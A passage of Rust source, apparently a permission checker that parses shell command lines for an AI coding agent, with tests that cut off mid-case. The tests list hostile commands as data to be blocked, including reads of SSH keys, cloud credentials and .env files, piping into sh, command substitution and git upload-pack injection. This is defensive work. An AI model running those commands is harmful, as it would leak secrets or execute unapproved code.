/// any letter it doesn't know counts as writing.
fn sed_script_reads(script: &str) -> bool {
    let chars: Vec<char> = script.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '/' {
            // An address: skip to its closing slash. One that doesn't close
            // could run on into the next `-e` script.
            let mut j = i + 1;
            while j < chars.len() && chars[j] != '/' {
                j += if chars[j] == '\\' { 2 } else { 1 };
            }
            if j >= chars.len() {
                return false;
            }
            i = j + 1;
            continue;
        }
        if matches!(c, ':' | 'b' | 't' | 'T') {
            // A label runs to the next `;` and can spell any command's letter.
            let mut j = i + 1;
            while j < chars.len() && !matches!(chars[j], ';' | '\n') {
                j += 1;
            }
            i = j;
            continue;
        }
        if c == 'y' && i + 1 < chars.len() {
            // Its two lists, and it takes no flags.
            let delim = chars[i + 1];
            if matches!(delim, '\\' | '\n') {
                return false;
            }
            let mut seen = 0;
            let mut j = i + 2;
            while j < chars.len() && seen < 2 {
                if chars[j] == '\\' {
                    j += 2;
                    continue;
                }
                if chars[j] == delim {
                    seen += 1;
                }
                j += 1;
            }
            if seen < 2 {
                return false;
            }
            i = j;
            continue;
        }
        if c == 's' && i + 1 < chars.len() {
            // Skip the pattern and the replacement, then read the flags.
            let delim = chars[i + 1];
            if matches!(delim, '\\' | '\n') {
                return false;
            }
            let mut seen = 0;
            let mut j = i + 2;
            while j < chars.len() && seen < 2 {
                if chars[j] == '\\' {
                    j += 2;
                    continue;
                }
                if chars[j] == delim {
                    seen += 1;
                }
                j += 1;
            }
            if seen < 2 {
                return false;
            }
            while j < chars.len() && !matches!(chars[j], ';' | '\n' | '}') {
                if matches!(chars[j], 'w' | 'W' | 'e') {
                    return false;
                }
                j += 1;
            }
            i = j;
            continue;
        }
        if !c.is_ascii_digit() && !" \t\n;,!{}$~+IMpPdqQnNDgGhHx=lzF".contains(c) {
            return false;
        }
        i += 1;
    }
    true
}

/// Whether a cargo command, after its toolchain, is a check that changes
/// nothing but the build folder.
fn cargo_checks(rest: &[String]) -> bool {
    let Some(sub) = rest.first() else {
        return false;
    };
    let args = &rest[1..];
    let fixes = args
        .iter()
        .any(|arg| arg == "--fix" || arg == "--allow-dirty");
    match sub.as_str() {
        "check" | "build" | "test" | "clippy" => !fixes,
        "nextest" => args.first().is_some_and(|arg| arg == "run"),
        "fmt" => args.iter().any(|arg| arg == "--check"),
        _ => false,
    }
}

/// Whether a package manager's command runs the project's tests or a
/// check script.
fn script_checks(rest: &[String]) -> bool {
    match rest.first().map(String::as_str) {
        Some("test") => true,
        Some("run") => rest.get(1).is_some_and(|script| {
            [
                "test",
                "lint",
                "typecheck",
                "check",
                "build",
                "format:check",
            ]
            .iter()
            .any(|start| script.starts_with(start))
        }),
        _ => false,
    }
}

/// `words` as one command line, each word quoted when the shell would
/// read it otherwise.
fn join(words: &[String]) -> String {
    words
        .iter()
        .map(|word| quote(word))
        .collect::<Vec<_>>()
        .join(" ")
}

/// One word as the shell reads it back.
fn quote(word: &str) -> String {
    let plain = !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c));
    if plain {
        word.to_owned()
    } else {
        format!("'{}'", word.replace('\'', r"'\''"))
    }
}

/// Splits a command line into its commands, each as its words with the
/// quotes taken off, or says why it's always asked about.
pub fn split(line: &str) -> Result<Vec<Part>, Refusal> {
    Ok(read(line)?
        .into_iter()
        .map(|command| command.words)
        .collect())
}

/// Reads a command line into its commands, or says why it's always asked
/// about.
fn read(line: &str) -> Result<Vec<Command>, Refusal> {
    let mut lexer = Lexer {
        chars: line.chars().collect(),
        at: 0,
        globbed: false,
    };
    let mut parts: Vec<Command> = Vec::new();
    let mut part = Command {
        words: Vec::new(),
        globs: Vec::new(),
    };
    loop {
        match lexer.token()? {
            Token::Word(word) => {
                if lexer.globbed {
                    part.globs.push(part.words.len());
                }
                part.words.push(word);
            }
            Token::Redirect(target) => {
                if target.is_some_and(|target| target != "/dev/null") {
                    return Err(Refusal::Output);
                }
            }
            Token::Break => {
                if !part.words.is_empty() {
                    parts.push(Command {
                        words: std::mem::take(&mut part.words),
                        globs: std::mem::take(&mut part.globs),
                    });
                }
            }
            Token::End => {
                if !part.words.is_empty() {
                    parts.push(part);
                }
                break;
            }
        }
    }
    if parts.is_empty() {
        return Err(Refusal::Empty);
    }
    for part in &parts {
        let first = &part.words[0];
        if matches!(first.as_str(), "sudo" | "su" | "doas") {
            return Err(Refusal::OtherUser);
        }
        if is_assignment(first) {
            return Err(Refusal::Assignment);
        }
    }
    Ok(parts)
}

/// Whether a command's first word sets a variable, as `NAME=value`.
fn is_assignment(word: &str) -> bool {
    let Some((name, _)) = word.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// What the lexer read next.
enum Token {
    /// A word with its quotes taken off.
    Word(String),
    /// A redirection, with the file it writes to, or none for one onto
    /// another descriptor.
    Redirect(Option<String>),
    /// `&&`, `||`, `;`, `|`, `|&` or a newline.
    Break,
    /// The end of the line.
    End,
}

/// Reads a command line a token at a time.
struct Lexer {
    chars: Vec<char>,
    at: usize,
    /// Whether the last word read has an unquoted `*` or `?`.
    globbed: bool,
}

impl Lexer {
    fn peek(&self, ahead: usize) -> Option<char> {
        self.chars.get(self.at + ahead).copied()
    }

    fn token(&mut self) -> Result<Token, Refusal> {
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' => self.at += 1,
                '\\' if self.peek(1) == Some('\n') => self.at += 2,
                '#' => {
                    while self.peek(0).is_some_and(|c| c != '\n') {
                        self.at += 1;
                    }
                }
                _ => break,
            }
        }
        let Some(c) = self.peek(0) else {
            return Ok(Token::End);
        };
        match c {
            '\n' | ';' => {
                self.at += 1;
                Ok(Token::Break)
            }
            '|' => {
                self.at += if matches!(self.peek(1), Some('|' | '&')) {
                    2
                } else {
                    1
                };
                Ok(Token::Break)
            }
            '&' => match self.peek(1) {
                Some('&') => {
                    self.at += 2;
                    Ok(Token::Break)
                }
                Some('>') => {
                    self.at += 1;
                    self.redirect()
                }
                _ => Err(Refusal::Grouping),
            },
            '<' => Err(Refusal::Input),
            '>' => self.redirect(),
            '(' | ')' => Err(Refusal::Grouping),
            _ => {
                let word = self.word()?;
                // A descriptor number right before `>` belongs to it.
                if self.peek(0) == Some('>') && word.chars().all(|c| c.is_ascii_digit()) {
                    return self.redirect();
                }
                Ok(Token::Word(word))
            }
        }
    }

    /// Reads a redirection from its `>`.
    fn redirect(&mut self) -> Result<Token, Refusal> {
        self.at += 1;
        if matches!(self.peek(0), Some('>' | '|')) {
            self.at += 1;
        }
        if self.peek(0) == Some('(') {
            return Err(Refusal::Substitution);
        }
        if self.peek(0) == Some('&') {
            self.at += 1;
            let mut fd = String::new();
            while let Some(c) = self.peek(0).filter(char::is_ascii_digit) {
                fd.push(c);
                self.at += 1;
            }
            let ends = self
                .peek(0)
                .is_none_or(|c| matches!(c, ' ' | '\t' | '\n' | ';' | '|' | '&'));
            return if fd.is_empty() || !ends {
                Err(Refusal::Output)
            } else {
                Ok(Token::Redirect(None))
            };
        }
        while matches!(self.peek(0), Some(' ' | '\t')) {
            self.at += 1;
        }
        match self.peek(0) {
            None | Some('\n' | ';' | '|' | '&' | '<' | '>' | '(' | ')') => Err(Refusal::Output),
            Some(_) => Ok(Token::Redirect(Some(self.word()?))),
        }
    }

    /// Reads one word up to an unquoted space or operator.
    fn word(&mut self) -> Result<String, Refusal> {
        let mut word = String::new();
        self.globbed = false;
        while let Some(c) = self.peek(0) {
            match c {
                ' ' | '\t' | '\n' | ';' | '|' | '&' | '<' | '>' | '(' | ')' => break,
                '`' => return Err(Refusal::Substitution),
                '$' if self.peek(1) == Some('(') => return Err(Refusal::Substitution),
                '$' | '{' | '}' | '[' => return Err(Refusal::Expansion),
                '*' | '?' => {
                    self.globbed = true;
                    word.push(c);
                    self.at += 1;
                }
                '\\' => {
                    match self.peek(1) {
                        Some('\n') => {}
                        Some(next) => word.push(next),
                        None => return Err(Refusal::Unclosed),
                    }
                    self.at += 2;
                }
                '\'' => {
                    self.at += 1;
                    loop {
                        match self.peek(0) {
                            None => return Err(Refusal::Unclosed),
                            Some('\'') => break,
                            Some(c) => word.push(c),
                        }
                        self.at += 1;
                    }
                    self.at += 1;
                }
                '"' => {
                    self.at += 1;
                    loop {
                        match self.peek(0) {
                            None => return Err(Refusal::Unclosed),
                            Some('"') => break,
                            Some('`') => return Err(Refusal::Substitution),
                            Some('$') if self.peek(1) == Some('(') => {
                                return Err(Refusal::Substitution);
                            }
                            // No shell expands a `$` right before the closing
                            // quote, or `{`, `}` and `[` anywhere inside these.
                            Some('$') if self.peek(1) != Some('"') => {
                                return Err(Refusal::Expansion);
                            }
                            Some('\\')
                                if matches!(self.peek(1), Some('"' | '\\' | '$' | '`' | '\n')) =>
                            {
                                if let Some(next) = self.peek(1).filter(|c| *c != '\n') {
                                    word.push(next);
                                }
                                self.at += 1;
                            }
                            Some(c) => word.push(c),
                        }
                        self.at += 1;
                    }
                    self.at += 1;
                }
                c => {
                    word.push(c);
                    self.at += 1;
                }
            }
        }
        Ok(word)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn folders() -> Folders {
        Folders::new(Path::new("/work/ws"), Path::new("/data/attached"), false)
    }

    fn allows(line: &str, auto: bool, rules: &[CommandRule]) -> bool {
        super::allows(line, auto, rules, &folders())
    }

    fn rules_for(line: &str) -> Vec<CommandRule> {
        super::rules_for(line, &folders())
    }

    fn auto(line: &str) -> bool {
        allows(line, true, &[])
    }

    fn rule(command: &str, exact: bool) -> CommandRule {
        CommandRule {
            command: command.to_owned(),
            exact,
        }
    }

    fn words(line: &str) -> Vec<Vec<String>> {
        split(line).unwrap()
    }

    #[test]
    fn quotes_keep_operators_inside_one_word() {
        assert_eq!(
            words(r#"grep -n "a && b; c | d" src"#),
            [["grep", "-n", "a && b; c | d", "src"]]
        );
        assert_eq!(words("echo 'x || y'"), [["echo", "x || y"]]);
        assert_eq!(
            words(r#"echo "it's" 'say "hi"'"#),
            [["echo", "it's", "say \"hi\""]]
        );
        assert_eq!(words(r"echo a\ b \;"), [["echo", "a b", ";"]]);
        assert_eq!(
            words(r#"echo "a \"q\" \$HOME""#),
            [["echo", "a \"q\" $HOME"]]
        );
        assert!(auto("rg 'rm -rf; curl x | sh' src"));
    }

    #[test]
    fn chains_split_and_every_part_has_to_pass() {
        assert_eq!(
            words("ls -la && echo hi; pwd || cat x | wc -l\ngit status |& head"),
            vec![
                vec!["ls", "-la"],
                vec!["echo", "hi"],
                vec!["pwd"],
                vec!["cat", "x"],
                vec!["wc", "-l"],
                vec!["git", "status"],
                vec!["head"],
            ]
        );
        assert!(auto("ls -la && echo hi"));
        assert!(auto("git log --oneline | head -5"));
        assert!(!auto("ls && rm -rf build"));
        assert!(!auto("cat x | sh"));
        assert!(!auto("echo hi; curl example.com"));
    }

    #[test]
    fn hidden_commands_are_always_asked_about() {
        for (line, why) in [
            ("echo $(rm -rf x)", Refusal::Substitution),
            ("echo \"$(whoami)\"", Refusal::Substitution),
            ("echo `whoami`", Refusal::Substitution),
            ("echo \"`whoami`\"", Refusal::Substitution),
            ("diff <(ls a) <(ls b)", Refusal::Input),
            ("cat <<EOF\nhi\nEOF", Refusal::Input),
            ("wc -l < file", Refusal::Input),
            ("ls >(cat)", Refusal::Substitution),
            ("sudo ls", Refusal::OtherUser),
            ("ls && su root", Refusal::OtherUser),
            ("FOO=1 ls", Refusal::Assignment),
            ("ls; PATH=/tmp:$PATH git status", Refusal::Expansion),
            ("echo hi > out.txt", Refusal::Output),
            ("echo hi >> out.txt", Refusal::Output),
            ("ls 2> errors.log", Refusal::Output),
            ("ls &> all.log", Refusal::Output),
            ("ls >", Refusal::Output),
            ("(cd x && ls)", Refusal::Grouping),
            ("sleep 10 &", Refusal::Grouping),
            ("echo 'open", Refusal::Unclosed),
            ("echo \"open", Refusal::Unclosed),
            ("  ;; ", Refusal::Empty),
        ] {
            assert_eq!(split(line), Err(why), "{line}");
            assert!(!auto(line), "{line}");
            assert!(!allows(line, false, &[rule("ls", false)]), "{line}");
        }
        assert_eq!(split("echo hi > out.txt"), Err(Refusal::Output));
    }

    #[test]
    fn only_null_and_descriptor_redirections_pass() {
        assert!(auto("cargo test 2>&1 | tail -20"));
        assert!(auto("ls missing 2>/dev/null"));
        assert!(auto("ls missing 2> /dev/null || echo none"));
        assert!(auto("grep -r x . >/dev/null 2>&1"));
        assert!(auto("ls &>/dev/null"));
        assert!(auto("echo oops >&2"));
        assert!(!auto("echo hi >&file"));
        assert!(!auto("echo hi >/dev/nullx"));
        // Quoted, `>` is just a character.
        assert!(auto("grep '>' notes.md"));
    }

    #[test]
    fn readers_pass_in_auto_and_others_ask() {
        for line in [
            "ls -la",
            "pwd",
            "cat README.md",
            "head -n 5 a b",
            "tree -L 2",
            "jq .name package.json",
            "rg -n 'fn main' crates",
            "echo hi",
            "cd crates && ls",
            "wc -l src/*.rs",
            "stat -f %z file",
        ] {
            assert!(auto(line), "{line}");
            assert!(!allows(line, false, &[]), "{line} outside Auto");
        }
        for line in [
            "awk '{print $1}' f",
            "xargs rm",
            "env",
            "sh -c 'ls'",
            "bash -c ls",
            "touch x",
            "mkdir y",
            "python3 -c 'print(1)'",
            "/bin/ls",
            "./run.sh",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn readers_that_would_write_or_run_something_ask() {
        for line in [
            "sort -o out.txt in.txt",
            "sort -ro out in",
            "sort --output=out in",
            "tree -o out.txt",
            "uniq in.txt out.txt",
            "rg --pre ./script x",
            "rg --pre=./script x",
            "fd -x rm",
            "fd . --exec-batch rm",
            "date -s 12:00",
            "git grep -Ovim x",
            "git grep --open-files-in-pager=vim x",
        ] {
            assert!(!auto(line), "{line}");
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        assert!(auto("sort -r -u in.txt"));
        assert!(auto("uniq -c in.txt"));
        assert!(auto("rg --pretty x"));
        assert!(auto("fd -e rs"));
        assert!(auto("date -u"));
    }

    #[test]
    fn find_and_sed_pass_only_when_they_read() {
        assert!(auto("find . -name '*.rs' -type f"));
        for flag in [
            "-exec rm {} ;",
            "-execdir ls ;",
            "-ok rm {} ;",
            "-delete",
            "-fprint out",
        ] {
            assert!(!auto(&format!("find . -name x {flag}")), "{flag}");
        }
        assert!(auto("sed -n '1,20p' file.rs"));
        assert!(auto("sed -n -e 's/a/b/g' -e '3p' f"));
        assert!(auto("sed 's|x|y|' f"));
        assert!(auto("sed -n '/error/p' log.txt"));
        assert!(auto("sed -n '/^fn /,/^}/p' a.rs"));
        assert!(auto("sed 'y/abc/xyz/' f"));
        assert!(!auto("sed '/x/w out' f"));
        assert!(!auto("sed '/x/e' f"));
        assert!(!auto("sed -i 's/a/b/' f"));
        assert!(!auto("sed -i.bak 's/a/b/' f"));
        assert!(!auto("sed --in-place 's/a/b/' f"));
        assert!(!auto("sed -ni 's/a/b/p' f"));
        assert!(!auto("sed 's/a/b/w out' f"));
        assert!(!auto("sed 's/a/b/e' f"));
        assert!(!auto("sed '1w out' f"));
        assert!(!auto("sed -e '$e date' f"));
        assert!(!auto("sed -f script.sed f"));
    }

    #[test]
    fn git_passes_only_what_reads() {
        for line in [
            "git status",
            "git log --oneline -5",
            "git diff HEAD~1 -- src",
            "git show 1a2b3c",
            "git -C sub show HEAD",
            "git --no-pager log -1",
            "git blame -L 1,9 a.rs",
            "git rev-parse HEAD",
            "git ls-files",
            "git for-each-ref refs/heads",
            "git branch",
            "git branch -a -vv",
            "git branch --contains 1a2b3c",
            "git branch --show-current",
            "git remote -v",
            "git remote",
            "git remote get-url origin",
            "git tag",
            "git tag -l 'v1.*'",
            "git stash list",
            "git config --get user.email",
            "git config --list",
            "git config --global --get user.name",
        ] {
            assert!(auto(line), "{line}");
        }
        for line in [
            "git push",
            "git commit -m x",
            "git add .",
            "git branch -D old",
            "git branch new",
            "git remote add up example.com",
            "git remote set-url origin x",
            "git tag v2",
            "git tag -d v1",
            "git stash",
            "git stash drop",
            "git config user.name x",
            "git config --get",
            "git -c core.pager=x log",
            "git log --output=out.txt",
            "git diff --output out.txt",
            "git reset --hard",
            "git checkout .",
            "git",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn project_checks_pass_but_installs_and_runs_do_not() {
        for line in [
            "cargo check",
            "cargo +1.99.0 clippy --workspace --all-targets -- -D warnings",
            "cargo test -p maxd cursor",
            "cargo build --release",
            "cargo nextest run",
            "cargo fmt --all --check",
            "go test ./...",
            "go vet ./...",
            "pytest -q",
            "tsc --noEmit -p .",
            "pnpm test",
            "npm test",
            "yarn test",
            "bun test",
            "pnpm run typecheck",
            "pnpm run lint:fix",
            "npm run build",
            "pnpm run test:desktop",
            "pnpm run format:check",
            "pnpm --filter desktop test",
            "pnpm -C apps/desktop run lint",
        ] {
            assert!(auto(line), "{line}");
        }
        for line in [
            "cargo fmt",
            "cargo clippy --fix",
            "cargo install ripgrep",
            "cargo publish",
            "cargo run",
            "go run .",
            "go get x",
            "tsc",
            "pnpm install",
            "pnpm add left-pad",
            "npm publish",
            "pnpm exec vite",
            "pnpm dlx create-x",
            "npm run deploy",
            "pnpm run format",
            "npx tsc --noEmit",
        ] {
            assert!(!auto(line), "{line}");
        }
    }

    #[test]
    fn rules_keep_the_command_and_its_subcommand() {
        let one = |line: &str| rules_for(line);
        assert_eq!(one("git show 1a2b3c"), [rule("git show", false)]);
        assert_eq!(
            one("git -C sub --no-pager log -1"),
            [rule("git log", false)]
        );
        assert_eq!(one("cargo test -p maxd"), [rule("cargo test", false)]);
        assert_eq!(one("cargo +nightly miri test"), [rule("cargo miri", false)]);
        assert_eq!(one("ls -la"), [rule("ls", false)]);
        assert_eq!(one("make clean"), [rule("make clean", false)]);
        assert_eq!(
            one("pnpm run dev --port 3000"),
            [rule("pnpm run dev", false)]
        );
        assert_eq!(one("pnpm --filter desktop dev"), [rule("pnpm dev", false)]);
        assert_eq!(one("gh pr view 12"), [rule("gh pr view", false)]);
        assert_eq!(one("git commit -m 'fix it'"), [rule("git commit", false)]);
        assert_eq!(
            one("cd app && mkdir -p out && touch out/a"),
            [rule("mkdir", false), rule("touch", false)]
        );
        assert_eq!(one("ls && ls -l"), [rule("ls", false)]);
        // A line that's always asked about saves nothing.
        assert!(one("echo $(id)").is_empty());
        assert!(one("echo hi > f").is_empty());
    }

    #[test]
    fn risky_commands_keep_their_exact_words() {
        let one = |line: &str| rules_for(line);
        assert_eq!(one("rm -rf build"), [rule("rm -rf build", true)]);
        assert_eq!(
            one("curl -sI 'https://example.com/a b'"),
            [rule("curl -sI 'https://example.com/a b'", true)]
        );
        assert_eq!(
            one("git push origin main"),
            [rule("git push origin main", true)]
        );
        assert_eq!(one("git branch -D old"), [rule("git branch -D old", true)]);
        assert_eq!(one("git tag -d v1"), [rule("git tag -d v1", true)]);
        assert_eq!(one("git -c a=b log"), [rule("git -c a=b log", true)]);
        assert_eq!(one("pnpm add left-pad"), [rule("pnpm add left-pad", true)]);
        assert_eq!(
            one("cargo publish --dry-run"),
            [rule("cargo publish --dry-run", true)]
        );
        assert_eq!(
            one("gh api repos/owner/repo"),
            [rule("gh api repos/owner/repo", true)]
        );
        assert_eq!(one("npm run publish"), [rule("npm run publish", true)]);
        assert_eq!(one("sed -i 's/a/b/' f"), [rule("sed -i s/a/b/ f", true)]);
        assert_eq!(one("find . -delete"), [rule("find . -delete", true)]);
        assert_eq!(one("python3 x.py"), [rule("python3 x.py", true)]);
        assert_eq!(
            one("git add . && git push"),
            [rule("git add", false), rule("git push", true)]
        );
        assert_eq!(
            one("echo \"it's\""),
            [rule("echo", false)],
            "a plain command keeps only its name"
        );
        assert_eq!(one("rm \"it's\""), [rule("rm 'it'\\''s'", true)]);
    }

    #[test]
    fn rules_match_what_they_were_saved_for_and_no_more() {
        let rules = [
            rule("git show", false),
            rule("cargo test", false),
            rule("ls", false),
            rule("rm -rf build", true),
            rule("git branch", false),
            rule("rm 'it'\\''s'", true),
        ];
        let ask = |line: &str| allows(line, false, &rules);
        assert!(ask("git show 9f8e7d"));
        assert!(ask("git -C sub show HEAD"));
        assert!(ask("cargo test -p other"));
        assert!(ask("ls -la /tmp && cargo test"));
        assert!(ask("rm -rf build"));
        assert!(ask("rm   -rf   'build'"));
        assert!(ask("rm \"it's\""));
        assert!(ask("cd x && ls"));
        assert!(!ask("rm -rf build2"));
        assert!(!ask("rm -rf build && rm -rf src"));
        assert!(!ask("git log"));
        assert!(!ask("cargo build"));
        assert!(!ask("ls && git push"));
        // A loose rule never covers the risky form of its command.
        assert!(ask("git branch -a"));
        assert!(!ask("git branch -D main"));
        // Nor does it get past a refusal.
        assert!(!ask("ls $(rm x)"));
        assert!(!ask("ls > out"));
        // Rules count in Auto too, along with what only reads.
        assert!(allows("git status && rm -rf build", true, &rules));
        assert!(!allows("git status && rm -rf build", false, &rules));
    }

    #[test]
    fn a_path_outside_the_folders_asks_in_auto() {
        for line in [
            "cat ~/notes.txt",
            "cat /etc/passwd",
            "cat ../other/file",
            "cat /work/ws2/file",
            "cat /work/ws/../other",
            "cat sub/../../other",
            "cat -- /etc/passwd",
            "ls .. ",
            "tree /",
            "du /",
            "grep -r token ~/.config",
            "grep -e foo /etc/passwd",
            "grep -f /etc/passwd x",
            "rg foo /etc",
            "rg --files /etc",
            "jq . /etc/passwd",
            "sed -n 1p /etc/passwd",
            "sed -e p /etc/p",
            "sort --files0-from=/etc/x",
            "head --lines=1 --bytes=/etc/x",
            "cargo test --manifest-path=/tmp/evil/Cargo.toml",
            "go build -o /tmp/x",
            "npm --prefix /tmp/evil test",
            "pnpm --dir /tmp/evil test",
            "pnpm -C/tmp/evil test",
        ] {
            assert!(!auto(line), "{line}");
        }
        for line in [
            "ls /work/ws/src",
            "cat /work/ws/.claude/settings.json",
            "cat /data/attached/picture.png",
            "cat ../ws/README.md",
            "cat ./README.md",
            "rg /etc src",
            "grep /usr README.md",
            "jq .name package.json",
            "sed -n '/x/p' a.rs",
            "sed -e '/x/p' a.rs",
            "echo /etc/passwd ~/.ssh",
            "git log a..b",
            "git diff HEAD~1",
            "go test ./...",
            "cargo test --features a/b",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn a_rule_for_a_project_tool_doesnt_cover_another_folder() {
        let rules = [
            rule("npm test", false),
            rule("cargo test", false),
            rule("git status", false),
            rule("git log", false),
            rule("ls", false),
        ];
        for line in [
            "npm --prefix /tmp/evil test",
            "cargo test --manifest-path=/tmp/evil/Cargo.toml",
            "git -C ~ log",
            "git --no-pager -C / status",
            "git -C ../other status",
        ] {
            for auto in [false, true] {
                assert!(!allows(line, auto, &rules), "{line} in Auto {auto}");
            }
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        assert!(allows("git -C sub log", false, &rules));
        assert!(allows("git -C vendor/evil.git status", true, &[]));
        // A plain command's rule covers it wherever it looks, outside Auto.
        assert!(allows("ls /tmp", false, &rules));
        assert!(!allows("ls /tmp", true, &rules));
        // Saving one of these keeps its words, so it can pass again in Auto.
        assert_eq!(rules_for("ls /tmp"), [rule("ls /tmp", true)]);
        assert!(allows("ls /tmp", true, &rules_for("ls /tmp")));
    }

    #[test]
    fn a_name_that_holds_secrets_asks_under_a_rule_too() {
        let rules = [
            rule("cat", false),
            rule("ls", false),
            rule("grep", false),
            rule("git log", false),
        ];
        for line in [
            "cat ~/.ssh/id_ed25519",
            "cat /home/you/.ssh/config",
            "cat .ssh/config",
            "cat ~/.aws/credentials",
            "cat ~/.gnupg/secring.gpg",
            "cat ~/.netrc",
            "cat .env",
            "cat .env.local",
            "cat config/.ENV",
            "cat ~/Library/Keychains/login.keychain-db",
            "cat id_rsa",
            "cat keys/server.pem",
            "cat ../.claude/settings.json",
            "cat ~/.claude/.credentials.json",
            "cat ~/.codex/auth.json",
            "cat ~/.cursor/mcp.json",
            "ls --directory=.ssh",
            "ls -I.ssh",
            "grep foo .env",
            "grep -e foo .env",
            "git log --output-indicator-new=.env",
        ] {
            for auto in [false, true] {
                assert!(!allows(line, auto, &rules), "{line} in Auto {auto}");
            }
            assert!(rules_for(line).iter().all(|rule| rule.exact), "{line}");
        }
        // A workspace may live under such a name itself.
        for (cwd, line) in [
            ("/home/you/id_tools/ws", "cat /home/you/id_tools/ws/a.rs"),
            (
                "/home/you/.claude/worktrees/ws",
                "cat /home/you/.claude/worktrees/ws/a.rs",
            ),
        ] {
            let place = Folders::new(Path::new(cwd), Path::new("/data/attached"), false);
            assert!(super::allows(line, true, &[], &place), "{line}");
        }
        // You can still say yes to those words.
        let line = "cat .env.example";
        assert!(allows(line, true, &rules_for(line)));
    }

    #[test]
    fn a_glob_asks_where_it_could_match_a_name_that_holds_secrets() {
        for line in [
            "cat *",
            "ls *",
            "ls src/*",
            "ls src/*/mod.rs",
            "grep foo *",
            "cat .e*",
            "cat .*",
            "cat *.pe?",
            "cat *.p?m",
            "cat *.pem",
            "cat *_rsa",
            "cat i?_rsa",
        ] {
            assert!(!auto(line), "{line}");
            assert!(
                !allows(line, false, &[rule("cat", false), rule("ls", false)]),
                "{line}"
            );
        }
        for line in ["wc -l src/*.rs", "ls *.md", "ls src/*_test.rs", "cat *.txt"] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    fn cd_passes_only_inside_the_folders() {
        for line in [
            "cd /",
            "cd ~",
            "cd",
            "cd -",
            "cd ~/.ssh",
            "cd .ssh",
            "cd ..",
            "cd .. && cd ..",
            "cd ~/.ssh; cd /",
            "cd /; ls",
            "cd ~/.ssh && cat id_ed25519",
            "cd /work/ws2 && ls",
            "cd s* && ls",
            "cd -P /etc",
            // A `cd` that fails leaves the line in another folder.
            "cd sub; cat ../../x",
            "cd sub && cat ../x",
            "cd sub && cd ..",
        ] {
            for mode in [false, true] {
                assert!(
                    !allows(line, mode, &[rule("cd", false), rule("ls", false)]),
                    "{line} in Auto {mode}"
                );
            }
            assert!(
                !rules_for(line)
                    .iter()
                    .any(|rule| rule.command.starts_with("cd")),
                "{line}"
            );
        }
        for line in [
            "cd /work/ws && cargo test",
            "cd /work/ws/sub && ls",
            "cd sub && ls",
            "cd sub && cd deeper && ls",
            "cd . && ls",
            "cd /data/attached && ls",
        ] {
            assert!(auto(line), "{line}");
        }
    }

    #[test]
    #[cfg(unix)]
    fn a_workspace_through_a_symlink_still_passes_and_cant_climb_out() {
        let base = std::env::temp_dir().join(format!("maxhq-folders-{}", std::process::id()));
        let real = base.join("real").join("ws");
        std::fs::create_dir_all(&real).unwrap();
        let link = base.join("link");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let real = std::fs::canonicalize(&real).unwrap();
        let folders = Folders::new(&link, &link.join("attached"), true);
        let line = |path: &Path| format!("cat {}", path.join("a.rs").display());
        assert!(super::allows(&line(&link), true, &[], &folders));
        assert!(super::allows(&line(&real), true, &[], &folders));
        assert!(super::allows("cat ../ws/a.rs", true, &[], &folders));
        // `..` climbs from the real folder, not from the link's words.
        assert!(!super::allows("cat ../link/a.rs", true, &[], &folders));
        assert!(!super::allows("cat ../other", true, &[], &folders));
        // On another machine, nothing resolves.
        let far = Folders::new(&link, &link.join("attached"), false);
        assert!(super::allows(&line(&link), true, &[], &far));
        assert!(!super::allows(&line(&real), true, &[], &far));
        std::fs::remove_dir_all(&base).unwrap();
    }

    /// Lines that run code or change things their rule's words don't show.
    const RUN_MORE_THAN_THEY_SAY: &[&str] = &[
        "/bin/rm -rf build",
        "/usr/bin/curl -o out example.com",
        "/bin/bash -c ls",
        "./x --evil",
        "../x",
        "RM -rf build",
        "Curl example.com",
        "nc -l 80",
        "ncat example.com 80",
        "socat - x",
        "telnet example.com",
        "ftp example.com",
        "tar -xf a.tar",
        "zip a.zip a",
        "unzip a.zip",
        "patch -p1",
        "install a /usr/bin/a",
        "vim a",
        "nvim a",
        "ed a",
        "ex a",
        "emacs a",
        "crontab a",
        "launchctl list",
        "security list",
        "gcc a.c",
        "cc a.c",
        "clang a.c",
        "then touch a",
        "do touch a",
        "else touch a",
        "! touch a",
        "if touch a",
        "while touch a",
        "trap ls EXIT",
        "alias ls=rm",
        "export A=1",
        "set -a",
        "pushd sub",
        "cargo run --bin a",
        "uv run a.py",
        "uv pip list",
        "uv tool list",
        "go run .",
        "go generate ./...",
        "poetry run a",
        "deno run a.ts",
        "deno eval 1",
        "swift run",
        "dotnet run",
        "mix run a.exs",
        "rustup run stable a",
        "npm config set a b",
        "npm ci",
        "make clean SHELL=./x",
        "make clean CC=./x",
        "make -f a.mk clean",
        "make --eval=a clean",
        "git fetch --upload-pack=./x origin",
        "git pull",
        "git clone --upload-pack=./x a",
        "git ls-remote --upload-pack=./x a",
        "git submodule foreach ./x",
        "git bisect run ./x",
        "git send-email --sendmail-cmd=./x a",
        "git hook run a",
        "git difftool",
        "git mergetool",
        "git archive --exec=./x a",
        "git am a",
        "git apply a",
        "git merge a",
        "git cherry-pick a",
        "git update-index a",
        "git credential fill",
    ];

    #[test]
    fn a_command_that_runs_more_than_it_says_keeps_its_exact_words() {
        for line in RUN_MORE_THAN_THEY_SAY {
            let rules = rules_for(line);
            assert!(rules.iter().all(|rule| rule.exact), "{line}: {rules:?}");
            assert!(allows(line, false, &rules), "{line}: {rules:?}");
            for mode in [false, true] {
                assert!(!allows(line, mode, &[]), "{line}");
            }
        }
    }

    #[test]
    fn a_rule_saved_before_doesnt_keep_passing_a_risky_program() {
        // The loose rule each of these lines used to save, as a project may
        // still have it stored.
        for (saved, line) in [
            ("/bin/rm", "/bin/rm -rf /"),
